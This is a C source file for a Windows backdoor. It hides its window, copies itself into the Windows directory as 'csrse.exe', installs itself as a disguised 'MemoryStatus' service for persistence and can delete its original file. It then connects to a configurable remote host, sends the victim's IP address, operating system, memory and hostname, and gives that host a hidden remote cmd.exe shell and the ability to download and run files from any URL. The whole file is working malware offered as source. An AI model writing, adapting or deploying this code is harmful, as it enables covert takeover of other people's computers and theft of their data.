#include <stdio.h>
#include<WinSock2.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <wininet.h>
// #include <process.h>

// GCC lwininet ws2_32
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma pack(1)
#pragma warning(disable: 4996) // avoid GetVersionEx to be warnedg
#define S_OK                                   ((HRESULT)0L)
#define S_FALSE                                ((HRESULT)1L)
#define false                                  FALSE
#define true                                   TRUE
#define bool                                   BOOL
#define ERROR_SUCCESS                           0L
#define SERVER_HEARTS                           0
// #define SERVER_HEARTS_SHELL                     13
#define SERVER_RESET                            1
#define SERVER_SHELL                            2
#define SERVER_SHELL_CHANNEL                    3
#define SERVER_DOWNLOAD                         4
#define SERVER_OPENURL                          8
#define SERVER_SYSTEMINFO                       10

               
#define SERVER_SHELL_ERROR                      12
// int WINAPI MessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
void WINAPI BDHandler(DWORD dwControl);
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
char const FLAG_[15] = "yyyyyyyyyyyyyyy";
char const domain[50] = "1111111111111111111111111111111111111111111111111";
char const port[5] = "2222";
char const SIGN[10] = "customize";
char const version[] = "Ver 1.0";
SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
    HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
SECURITY_ATTRIBUTES saIn, saOut;

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
struct CMSG{
        char sign[10];
        UINT16 mod;//自定义模式
        UINT32 msg_l;
};
struct CFILE{
    char address[255];
    char save_path[255];
    UINT16 execute;
};

//-----------------------------TOOLKIT FUNCTION START------------------------------------------------

BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet, hUrl;
	HANDLE		hFile;
	char		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	BOOL		bRet = true;
	
	hInternet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	if (hInternet == NULL)
		return false;
	
	hUrl = InternetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hUrl == NULL)
		return false;
	
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			InternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}
	
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);
	
	return bRet;
}

DWORD WINAPI DownManager(LPVOID lparam,LPCTSTR save_path,UINT8 execute)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	if (save_path!=NULL){
        lpFileName = save_path;
    }else{
        lpFileName = strrchr(lpURL, '/') + 1;
    }
	
	if (lpFileName == NULL)
		return false;

	if (!http_get(lpURL, lpFileName))
	{
		return false;
	}

	if (execute){
        STARTUPINFO si = {0};
	    PROCESS_INFORMATION pi;
	    si.cb = sizeof si;
	    si.lpDesktop = "WinSta0\\Default"; 
	    CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    }

	return true;
}

//OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL); 显示打开网页
//OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);   隐藏打开网页
BOOL OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return FALSE;

	// System 权限下不能直接利用shellexecute来执行
	char	*lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
	HKEY	hKey;
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return FALSE;
	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);

	if (lstrlen(strIEPath) == 0)
		return FALSE;

	lpstrCat = strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return FALSE;

	lstrcpy(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 

	CreateProcess(NULL, strIEPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return 0;
}

void DelItself(char *szPath)
{
    FILE *pFile=NULL;
    pFile=fopen("T.bat","w");
    if(pFile==NULL)
    {
        return;
    }
    char*szBat=(char*)malloc(230);
    printf(szPath);                       
    sprintf(szBat,"del %s\r\n del T.bat",szPath);
    DWORD dwNum = 0;
    fputs(szBat,pFile);
    fclose(pFile);
    free(szBat);
    ShellExecuteA(NULL,"open","T.bat","","",SW_HIDE);
}

BOOL CopySelf(char* szPath,char *trPath,int bigger){
    if (bigger == 0){
        CopyFile(szPath,trPath,TRUE);
        return TRUE;
    }else{
        HANDLE pFile;
        DWORD fileSize;
        char *buffer;
        DWORD dwBytesRead,dwBytesToRead,tmpLen;
        pFile = CreateFile(szPath,GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if ( pFile == INVALID_HANDLE_VALUE){
            CloseHandle(pFile);
            return FALSE;
        }
        fileSize = GetFileSize(pFile,NULL);
        buffer = (char *) malloc(fileSize);
        ZeroMemory(buffer,fileSize);
        dwBytesToRead = fileSize;
        dwBytesRead = 0;
        ReadFile(pFile,buffer,dwBytesToRead,&dwBytesRead,NULL);
        CloseHandle(pFile);

        HANDLE pFile2;
        DWORD dwBytesWrite,dwBytesToWrite;
        pFile2 = CreateFile(trPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,  FILE_ATTRIBUTE_NORMAL,NULL);

        if ( pFile2 == INVALID_HANDLE_VALUE){
            CloseHandle(pFile);
            return FALSE;
        }
        dwBytesToWrite = fileSize;
        dwBytesWrite = 0;
        WriteFile(pFile2,buffer,dwBytesToWrite,&dwBytesWrite,NULL);

        char *blank= (char *) malloc(1024);
        ZeroMemory(blank,1024);
        for(int i = 0;i< bigger;i++){
            WriteFile(pFile2,blank,1024,&dwBytesWrite,NULL);
        }
        free(blank);
        CloseHandle(pFile2);
        free(buffer);

    }
}

//-----------------------------TOOLKIT FUNCTION END--------------------------------------------------



//-------------------------SYSTEM INFOMATION START---------------------------------------------------


char* getIpAddress(){
    WSADATA wsaData;
    char name[255];//定义用于存放获得的主机名的变量 
    char *ip;//定义IP地址变量 
    PHOSTENT hostinfo;
    if ( WSAStartup( MAKEWORD(2,0), &wsaData ) == 0 ) {
        if( gethostname ( name, sizeof(name)) == 0) {
            if((hostinfo = gethostbyname(name)) != NULL) {
                ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
            }
        }
    }
    return ip;
}
char* getOsInfo()
{
	// get os name according to version number
	OSVERSIONINFO osver = { sizeof(OSVERSIONINFO) };
	GetVersionEx(&osver);
	char *os_name;
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)
		os_name = "Windows 2000";
	else if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 1)
		os_name = "Windows XP";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0)
		os_name = "Windows 2003";
	else if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2)
		os_name = "windows vista";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1)
		os_name = "windows 7";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2)
		os_name = "windows 10";
    return os_name;
}
char* getMemoryInfo()
{
    #define  GBYTES  1073741824  
    #define  MBYTES  1048576  
    #define  KBYTES  1024  
    #define  DKBYTES 1024.0 
    #define kMaxInfoBuffer 256

	char* memory_info;
    char  buffer[kMaxInfoBuffer];

	MEMORYSTATUSEX statusex;
	statusex.dwLength = sizeof(statusex);
	if (GlobalMemoryStatusEx(&statusex))
	{
		unsigned long long total = 0, remain_total = 0, avl = 0, remain_avl = 0;
		double decimal_total = 0, decimal_avl = 0;
		remain_total = statusex.ullTotalPhys % GBYTES;
		total = statusex.ullTotalPhys / GBYTES;
		avl = statusex.ullAvailPhys / GBYTES;
		remain_avl = statusex.ullAvailPhys % GBYTES;
		if (remain_total > 0)
			decimal_total = (remain_total / MBYTES) / DKBYTES;
		if (remain_avl > 0)
			decimal_avl = (remain_avl / MBYTES) / DKBYTES;
 
		decimal_total += (double)total;
		decimal_avl += (double)avl;
		
		sprintf(buffer, "Total %.2f GB (%.2f GB available)", decimal_total, decimal_avl);
		memory_info = buffer;
        // printf(memory_info);
        return memory_info;
	}
	
}
char* getComperName(){
    char *name;
    char szPath[128] = "";
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    gethostname(szPath, sizeof(szPath));
    printf("%s\n", szPath);
    WSACleanup();
    name=szPath;
    return name;

}
char* getSystemInfomation(char* systeminfo){
    static char data[1024];
    char *os;
    char *ip;
    char * memory;
    char * name;
    os = getOsInfo();
    ip = getIpAddress();
    memory = getMemoryInfo();
    name = getComperName();
    sprintf(data,"%s\n%s\n%s\n%s\n",ip,os,memory,name);
    if (data[1024] != '\0'){
       data[1024]='\0'; 
    }
    strcpy(systeminfo,data);
    
}

//-------------------------SYSTEM INFOMATION END-----------------------------------------------------

void BackDoor(SOCKET sock){
    
    
    int ret;
    char Buff[1024]; 
    SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
    HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
    pipeattr1.nLength=12; 
    pipeattr1.lpSecurityDescriptor=0; 
    pipeattr1.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0); 
    pipeattr2.nLength=12; 
    pipeattr2.lpSecurityDescriptor=0; 
    pipeattr2.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0); 
    STARTUPINFO si; 
    ZeroMemory(&si,sizeof(si)); 
    si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    si.wShowWindow=SW_HIDE; 
    si.hStdInput=hReadPipe2; 
    si.hStdOutput=si.hStdError=hWritePipe1; 
    char cmdline[]="cmd.exe"; 
    PROCESS_INFORMATION ProcessInformation; 
    ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation); 

    unsigned long lBytesRead; 
    while (1) 
    { 
        printf("looping...\n");
        ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0, 0  ); 
        if (lBytesRead) 
        { 
            
            ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
            printf("ret: %d read:\n%s\n",ret,Buff);
            if (!ret) {
                struct CMSG emsg = {
                    .sign =  "customize",
                    .mod = SERVER_SHELL_ERROR,
                    .msg_l = 0
                    };
                send(sock,(char*)&emsg,sizeof(struct CMSG),0);
            }
            struct CMSG msg = {
                .sign =  "customize",
                .mod = SERVER_SHELL_CHANNEL,
                .msg_l = lBytesRead
             };
            printf("SendLen:%d\n,RecvLen:%d\n",strlen(Buff),lBytesRead);
            send(sock,(char*)&msg,sizeof(struct CMSG),0);
            ret=send(sock,Buff+'\0',lBytesRead,0);
            printf("Send:\n%s\nSendEnd\n",Buff);
            ZeroMemory(Buff,1024);
            if (ret<=0) {struct CMSG emsg = {
                    .sign =  "customize",
                    .mod = SERVER_RESET,
                    .msg_l = 0
                    };
                    send(sock,(char*)&emsg,sizeof(struct CMSG),0);
                    break;}; 
        } else { 
            char * address = malloc(sizeof(struct CMSG));
            recv(sock,address,sizeof(struct CMSG),0);
            struct CMSG msg = *(struct CMSG*)address;
            free(address);
            switch (msg.mod){
                case SERVER_HEARTS:
                    
                    continue;
                case SERVER_SHELL_CHANNEL:{
                    lBytesRead=recv(sock,Buff,1024,0);
                    printf("Recv Len:%d Recv:\n%s\nRecvEnd\n",lBytesRead,Buff);

                    if (lBytesRead<=0) {
                        break;
                    }//没数据or服务器退出(mod:1) 
                    Buff[lBytesRead]='\n';
                    Buff[lBytesRead+1]=0;
                    printf("[");
                    int len= strlen(Buff); 
                    for (int i = 0; i < len; ++i) 
                    {
                        printf("%d ", Buff[i]);
                    }
                    printf("]\n");
                    ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);

                    ZeroMemory(Buff,1024);
                    if (!ret) break; 
                    if (ret<=0)break;
                    Sleep(600);
                    continue;
                }
                case SERVER_RESET:{
                    struct CMSG emsg = {
                    .sign =  "customize",
                    .mod = SERVER_RESET,
                    .msg_l = 0
                    };
                    send(sock,(char*)&emsg,sizeof(struct CMSG),0);
                	return;  
                }

            }
            
            // Sleep(600);
        }
    }
    return;
}


void Handle(){
    WSADATA WSAData;
    SOCKET sock; 
    DWORD dwIP = 0; 
    SOCKADDR_IN addr_in;
    

    
    WSAStartup(MAKEWORD(2,2),&WSAData); 
    HOSTENT* pHS = gethostbyname(domain);
    if(pHS!=NULL){
    struct in_addr addr;
    CopyMemory(&addr.S_un.S_addr, pHS->h_addr_list[0], pHS->h_length);
    dwIP = addr.S_un.S_addr;
    }else{
        WSACleanup();
        return;
    }

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(atoi(port)); 
    addr_in.sin_addr.S_un.S_addr=dwIP;
 
    sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    
    if (WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR) {
        return;
    }
    char  systeminfo[1024] ;
    getSystemInfomation(systeminfo);
    struct CMSG msg = {
                .sign =  "customize",
                .mod = SERVER_SYSTEMINFO,
                .msg_l = (UINT32)strlen(systeminfo)
                //.msg_l = 0
             };

    send(sock,(char*)&msg,sizeof(struct CMSG),0);
    send(sock,systeminfo,strlen(systeminfo),0);//初始化信息
    while (TRUE){
        char * address = malloc(sizeof(struct CMSG));
        int ret = recv(sock,address,sizeof(struct CMSG),0);
        struct CMSG msg = *(struct CMSG*)address;
        printf("size:%d:\nSign:%s\nMOD:%d\nLONG:%d\n",sizeof(struct CMSG),msg.sign,msg.mod,msg.msg_l);
        
        
        if(ret == -1 || ret <= 0){
            break;
        }

        if (strcmp(msg.sign,SIGN) != 0){
            printf("echo debug dafa hao");
            continue;
        }
        switch (msg.mod){
            case SERVER_HEARTS:
                {struct CMSG msg = {
                .sign =  "customize",
                .mod = SERVER_HEARTS,
                .msg_l = 0
             };}
                ret = send(sock,(char*)&msg,sizeof(struct CMSG),0);//心跳包
                continue;
            case SERVER_SHELL:
                // CMD命令  
                BackDoor(sock);
                continue;
            case SERVER_DOWNLOAD:
                {

                    char * address2 = malloc(sizeof(struct CFILE));
                    

                    ret = recv(sock,address2,sizeof(struct CFILE),0);
                    
                    struct CFILE f_obj = *(struct CFILE*)address2;
                    //printf("len:%d\n",msg.msg_l);
                    
                    if (ret <= 0){
                        
                        continue;
                    }
                    printf("address:%s\npath:%s\nrun:%d\n",f_obj.address,f_obj.save_path,f_obj.execute);
                    if(f_obj.address && strcmp(f_obj.save_path, "NULL")){
                        DownManager(f_obj.address,NULL,f_obj.execute);
                    }else{
                        DownManager(f_obj.address,f_obj.save_path,f_obj.execute);
                    }
                    free(address2);
                    continue;
                }
                
            case SERVER_OPENURL:
                {
                    continue;
                }
            case SERVER_SYSTEMINFO:
                continue;
            

        }
        free(address);
        
        

    }
}
void Init(){

    CreateEventA(0,FALSE,FALSE,"MemoryStatus");
    while(1){
        Handle();
        Sleep(3000);
    }
}

void WINAPI ServiceMain(DWORD dwArgc,  LPTSTR* lpszArgv){
    DWORD dwThreadId;
    // WriteToLog("Running..");
    if (!(ServiceStatusHandle = RegisterServiceCtrlHandler("MemoryStatus",
                     BDHandler))) return;
    ServiceStatus.dwServiceType  = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState  = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP
                      | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode        = 0;
    ServiceStatus.dwCheckPoint            = 0;
    ServiceStatus.dwWaitHint              = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    Init();
}


void WINAPI BDHandler(DWORD dwControl)
{
 switch(dwControl)
 {
    case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    default:
        break;
 }
}

void ServiceInstall(BOOL auto_delete){
    char  szPath[MAX_PATH];
    char  target[MAX_PATH] ;
    char  tar_path[MAX_PATH];
    char  Direectory[MAX_PATH];
    char  cmd[255];
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (OpenEventA(2031619,FALSE,"MemoryStatus") != 0 ){
        return ;
    }
    // AdvanceProcess();
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = (char*)"MemoryStatus";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable); 
     if ( !GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH) ) return ;
    
    if( !GetModuleFileName( NULL, (LPSTR)szPath, MAX_PATH ) ) return ;
    
    if(!GetCurrentDirectory(MAX_PATH,Direectory)) return ;
    // printf("Direectory:%s\nszPath:%s\ntarget:%s\n",Direectory,szPath,target);
    if (strcmp(Direectory,target) != 0 ){
        //判断是否在windows目录下
        strcat(target,"\\csrse.exe");
        // printf(target);
        //CopyFile(szPath,target,TRUE);
        if (!CopySelf(szPath,target,0)){
            CopyFile(szPath,target,TRUE);
        }

        sprintf(cmd,"sc create MemoryStatus binPath= %s",target);
        // ShellExecuteA(NULL,"open","sc.exe",cmd,"",SW_HIDE);
        // ShellExecuteA(NULL,"open","sc.exe","start MemoryStatus","",SW_HIDE);
        system(cmd);
        //sprintf(cmd,"attrib +s +a +h +r %s",target);
        system(cmd);
        system("sc start MemoryStatus");
        if (auto_delete)DelItself(szPath);
        
        exit(0);
        return ;
     }
    // printf("\nRun");
}

int _stdcall WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{
    ServiceInstall(false);
    
    Init();
    return 0;
}
